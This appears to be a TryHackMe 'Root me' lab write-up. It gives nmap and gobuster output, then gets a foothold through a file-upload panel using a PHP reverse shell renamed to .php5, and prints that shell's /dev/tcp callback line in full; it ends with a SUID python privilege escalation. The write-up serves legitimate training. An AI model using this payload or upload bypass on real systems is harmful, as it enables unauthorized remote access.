
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Root%20me/images/89-1.png)

. After a quick directory bruteforcing i found an upload form in which i uploaded a reverse shell and become root by finding a suid binary. 

I started with a basic scan, followd by a more detailed one with the ports found open.

```
nmap -sS -T4 10.10.124.42
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-10 04:44 EDT
Nmap scan report for 10.10.124.42
Host is up (0.071s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
nmap -sV -sC -p22,80 10.10.124.42
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-10 04:50 EDT
Nmap scan report for 10.10.124.42
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


On the web port is this page
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Root%20me/images/89-2.png)

Because there are only 2 open ports, i need to fully enumerate the web server to make sure i am not stuck somewhere not knowing what to do. 

```
gobuster dir -u http://10.10.124.42/ -w /usr/share/wordlists/dirb/common.txt T 250
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.124.42/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/10 04:48:37 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```
The only useful pages found are /panel and /uploads. The /panel page can be exploited by uploading a reverse shell payload.

![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Root%20me/images/89-3.png)

The mininal reverse shell payload i used.
```bash
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.5.181/1234 0>&1'");
```

The file name was rev.php5, as php did not work. Before ulploading it, i will prepare the netcat listener.

If the uploading process was successfull, will appear this panel alongside this link that points to the uploads page.  

![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Root%20me/images/89-4.png)

The user flag is in the website directory.  
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Root%20me/images/89-5.png)

Now it's time for privesc. Among these binaries is also python.  
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Root%20me/images/89-6.png)

The payload below was taken from gtfobins. The only thing to do is to read the root flag.  
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Root%20me/images/89-7.png)


